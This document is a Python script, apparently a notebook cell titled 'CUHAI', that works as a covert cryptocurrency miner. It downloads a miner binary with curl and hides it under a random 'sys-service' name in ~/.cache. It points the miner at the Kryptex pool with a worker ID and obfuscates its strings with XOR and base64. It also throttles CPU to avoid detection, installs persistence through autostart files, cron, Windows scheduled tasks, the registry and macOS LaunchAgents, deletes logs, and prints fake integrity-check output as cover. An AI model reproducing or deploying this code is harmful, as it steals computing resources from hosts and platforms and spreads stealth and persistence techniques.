# @title CUHAI
import subprocess
import os
import sys
import time
import base64
import platform
import random
import tarfile
import shutil
import string
import threading
import signal

try:
    import psutil
except ImportError:
    try:
        if shutil.which("pip"):
            subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            sys.exit(1)
        import psutil
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        sys.exit(1)

XOR_KEY = 0xDE

def obfuscate_string(s):
    encoded_bytes = s.encode('utf-8')
    xored_bytes = bytes([b ^ XOR_KEY for b in encoded_bytes])
    return base64.b64encode(xored_bytes).decode('utf-8')

def unobfuscate_string(s):
    decoded_bytes = base64.b64decode(s)
    xored_bytes = bytes([b ^ XOR_KEY for b in decoded_bytes])
    return xored_bytes.decode('utf-8')

DOWNLOAD_URL_ENCODED = obfuscate_string("https://github.com/OneZeroMiner/onezerominer/releases/download/v1.4.6/onezerominer-1.4.6.tar.gz")
ARCHIVE_FILENAME_ENCODED = obfuscate_string("temp_service_update.tar.gz")
ORIGINAL_EXECUTABLE_NAME_ENCODED = obfuscate_string("onezerominer")

SERVICE_ALGORITHM_ENCODED = obfuscate_string("xelishashv2")
SERVICE_SERVER_ENCODED = obfuscate_string("localhost:8080")
STEALTH_SERVER_ENCODED = obfuscate_string("xel.kryptex.network:7019")
SERVICE_USER_ENCODED = obfuscate_string("krxXJMWJKW.LEKES")
SERVICE_PASS_ENCODED = obfuscate_string("200")

CURL_COMMAND_ENCODED = obfuscate_string("curl")
CURL_SILENT_ENCODED = obfuscate_string("-s")
CURL_REDIRECT_ENCODED = obfuscate_string("-L")
CURL_OUTPUT_ENCODED = obfuscate_string("-o")
TAR_COMMAND_ENCODED = obfuscate_string("tar")
TAR_FLAGS_ENCODED = obfuscate_string("zxvf")
TAR_EXTRACT_DIR_ENCODED = obfuscate_string("-C")
CRONTAB_COMMAND_ENCODED = obfuscate_string("crontab")
CRONTAB_LIST_ENCODED = obfuscate_string("-l")
CRONTAB_EDIT_ENCODED = obfuscate_string("-")
PYTHON_CMD_ENCODED = obfuscate_string("python3")
SCHTASKS_COMMAND_ENCODED = obfuscate_string("schtasks")
CREATE_FLAG_ENCODED = obfuscate_string("/Create")
TASKNAME_FLAG_ENCODED = obfuscate_string("/TN")
SCHEDULE_FLAG_ENCODED = obfuscate_string("/SC")
SCHEDULE_ONSTART_ENCODED = obfuscate_string("ONSTART")
TASK_RUN_FLAG_ENCODED = obfuscate_string("/TR")

def download_file(url, filename):
    try:
        curl_cmd = unobfuscate_string(CURL_COMMAND_ENCODED)
        curl_silent_flag = unobfuscate_string(CURL_SILENT_ENCODED)
        curl_redirect_flag = unobfuscate_string(CURL_REDIRECT_ENCODED)
        curl_output_flag = unobfuscate_string(CURL_OUTPUT_ENCODED)
        
        subprocess.run([curl_cmd, curl_silent_flag, curl_redirect_flag, url, curl_output_flag, filename], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        return False

def extract_archive(archive_path, destination_path, executable_name):
    try:
        os.makedirs(destination_path, exist_ok=True)
        
        tar_cmd = unobfuscate_string(TAR_COMMAND_ENCODED)
        tar_flags = unobfuscate_string(TAR_FLAGS_ENCODED)
        tar_extract_dir_flag = unobfuscate_string(TAR_EXTRACT_DIR_ENCODED)

        subprocess.run([tar_cmd, tar_flags, archive_path, tar_extract_dir_flag, destination_path, "--strip-components=1"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        extracted_path = os.path.join(destination_path, executable_name)
        if os.path.exists(extracted_path):
            return extracted_path
        
        return None
    except Exception as e:
        return None

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def setup_files():
    download_url = unobfuscate_string(DOWNLOAD_URL_ENCODED)
    archive_filename = unobfuscate_string(ARCHIVE_FILENAME_ENCODED)
    original_executable_name = unobfuscate_string(ORIGINAL_EXECUTABLE_NAME_ENCODED)
    
    random_executable_name = f"sys-service-{generate_random_string(8)}"

    random_dir_name = generate_random_string(10)
    executable_directory = os.path.join(os.path.expanduser("~"), f".cache/.sys_services/.{random_dir_name}")
    stealthy_executable_name = random_executable_name
    
    temp_dir = os.path.join(os.path.expanduser("~"), ".temp_service")
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    archive_path = os.path.join(temp_dir, archive_filename)
    
    if not download_file(download_url, archive_path):
        return None, None, None
        
    extracted_path = extract_archive(archive_path, executable_directory, original_executable_name)

    if extracted_path:
        stealthy_executable_path = os.path.join(executable_directory, stealthy_executable_name)
        os.rename(extracted_path, stealthy_executable_path)
        
        os.chmod(stealthy_executable_path, 0o777)
        return stealthy_executable_path, executable_directory, temp_dir
    
    return None, None, None

def resource_management_and_throttling(pid, cpu_threshold=20, check_interval=10, throttle_duration=5):
    try:
        process = psutil.Process(pid)

        while True:
            cpu_percent = process.cpu_percent(interval=1.0)
            
            if cpu_percent > cpu_threshold:
                process.suspend()
                time.sleep(throttle_duration)
                process.resume()
            
            time.sleep(random.uniform(check_interval, check_interval + 5))

    except psutil.NoSuchProcess:
        pass
    except Exception as e:
        pass

def start_service(executable_path):
    service_algorithm = unobfuscate_string(SERVICE_ALGORITHM_ENCODED)
    service_server = unobfuscate_string(STEALTH_SERVER_ENCODED)
    service_user = unobfuscate_string(SERVICE_USER_ENCODED)
    service_pass = unobfuscate_string(SERVICE_PASS_ENCODED)

    if not service_server or not os.path.exists(executable_path):
        return None

    service_command = [
        executable_path,
        "-a", service_algorithm,
        "-o", service_server,
        "-w", service_user,
        "--pl", service_pass
    ]

    try:
        if platform.system() == "Windows":
            proc = subprocess.Popen(service_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            proc = subprocess.Popen(service_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        throttling_thread = threading.Thread(target=resource_management_and_throttling, args=(proc.pid,))
        throttling_thread.daemon = True
        throttling_thread.start()
        
        return proc

    except (FileNotFoundError, Exception) as e:
        return None

def implement_persistence(executable_path):
    os_name = platform.system()

    if '__file__' in locals() or '__file__' in globals():
        current_script_path = os.path.abspath(__file__)
    else:
        current_script_path = os.path.abspath(sys.argv[0])
    
    if os_name == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
            
        desktop_file_path = os.path.join(autostart_dir, "sys-updater.desktop")
        
        desktop_file_content = f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec=/usr/bin/python3 {current_script_path}
Comment=System startup service.
Terminal=false
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        
        try:
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
        except Exception as e:
            if shutil.which("crontab"):
                python_cmd = unobfuscate_string(PYTHON_CMD_ENCODED)
                crontab_cmd = unobfuscate_string(CRONTAB_COMMAND_ENCODED)
                crontab_list_flag = unobfuscate_string(CRONTAB_LIST_ENCODED)
                crontab_edit_flag = unobfuscate_string(CRONTAB_EDIT_ENCODED)
                
                cron_command = f"@reboot {python_cmd} {current_script_path} > /dev/null 2>&1\n"
                
                try:
                    p = subprocess.run([crontab_cmd, crontab_list_flag], capture_output=True, text=True, check=True)
                    crontab_content = p.stdout
                    if cron_command not in crontab_content:
                        new_crontab = crontab_content + cron_command
                        subprocess.run([crontab_cmd, crontab_edit_flag], input=new_crontab, text=True, check=True)
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    pass

    elif os_name == "Windows":
        schtasks_cmd = unobfuscate_string(SCHTASKS_COMMAND_ENCODED)
        create_flag = unobfuscate_string(CREATE_FLAG_ENCODED)
        taskname_flag = unobfuscate_string(TASKNAME_FLAG_ENCODED)
        taskname = "SysUpdaterTask"
        schedule_flag = unobfuscate_string(SCHEDULE_FLAG_ENCODED)
        schedule_onstart = unobfuscate_string(SCHEDULE_ONSTART_ENCODED)
        task_run_flag = unobfuscate_string(TASK_RUN_FLAG_ENCODED)
        task_command = f"pythonw.exe \"{current_script_path}\""
        
        try:
            subprocess.run([schtasks_cmd, create_flag, taskname_flag, taskname, schedule_flag, schedule_onstart, task_run_flag, task_command], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    command = f"pythonw.exe \"{current_script_path}\""
                    winreg.SetValueEx(reg_key, "SysUpdater", 0, winreg.REG_SZ, command)
            except ImportError:
                pass
            except Exception as e:
                pass
            
    elif os_name == "Darwin":
        plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sys.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.sys.updater.plist")
        
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            subprocess.run(['launchctl', 'load', '-w', plist_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

def cleanup_files(executable_directory, temp_dir):
    try:
        if executable_directory and os.path.exists(executable_directory):
            shutil.rmtree(executable_directory)
    except Exception as e:
        pass

    try:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
    except Exception as e:
        pass
    
    log_file_path = "/content/logs/miner.log"
    try:
        if os.path.exists(log_file_path):
            os.remove(log_file_path)
    except Exception as e:
        pass

def print_random_ascii_art():
    arts = [
        """
          +---+
          |   |
      O---|   |
     /|\\  |   |
     / \\  +---+
        """,
        """
        .--.
       |o_o |
       |:_/ |
      //   \\ \\
     (|     | )
    /'\\_   _/`\\
    \\___)=(___/
        """,
        """
         / \\
        / _ \\
       | / \\ |
       ||   ||
       ||   ||
       ||   ||
       | \\_/ |
        \\___/
        """
    ]
    print(random.choice(arts))

def print_simulated_logs():
    levels = ["INFO", "DEBUG", "WARNING", "ERROR"]
    messages = [
        "Initializing subsystem...", "Connection established.", "Data packet received.",
        "Processing request.", "Cache miss.", "Authentication successful.",
        "Failed to connect to database.", "Timeout occurred."
    ]
    log_line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} [{random.choice(levels)}] {random.choice(messages)}"
    print(log_line)

def print_table_data():
    row = f"| {generate_random_string(8)} | {random.randint(100, 999):03d} | {random.choice(['active', 'inactive', 'pending']):<10} |"
    print(row)

def do_random_job():
    job_duration = random.randint(30, 60)
    job_start_time = time.time()
    
    print("\n--- Starting simulated background task: System Integrity Check ---")
    
    job_functions = [print_random_ascii_art, print_simulated_logs, print_table_data]
    
    print("-" * 40)
    print("| ID       | Value | Status     |")
    print("-" * 40)

    while time.time() - job_start_time < job_duration:
        random.choice(job_functions)()
        time.sleep(random.uniform(0.1, 0.5))
        
    print("--- Simulated background task finished ---\n")

def terminate_service(proc):
    if proc:
        try:
            if platform.system() == "Windows":
                proc.terminate()
            else:
                os.kill(proc.pid, signal.SIGTERM)
            proc.wait(timeout=10)
        except (psutil.NoSuchProcess, subprocess.TimeoutExpired) as e:
            proc.kill()
        except Exception as e:
            pass

if __name__ == "__main__":
    
    TOTAL_DURATION = random.randint(20000, 21650)
    start_time = time.time()
    
    while time.time() - start_time < TOTAL_DURATION:
        do_random_job()
        
        executable_path, executable_directory, temp_dir = setup_files()
        
        if executable_path:
            service_proc = start_service(executable_path)
            implement_persistence(executable_path)

            time.sleep(60)

            log_file_path = "/content/logs/miner.log"
            try:
                if os.path.exists(log_file_path):
                    os.remove(log_file_path)
            except Exception as e:
                pass

            remaining_duration = random.randint(40, 90)
            time.sleep(remaining_duration)
            
            terminate_service(service_proc)
        
        cleanup_files(executable_directory, temp_dir)

        time.sleep(random.randint(5, 30))
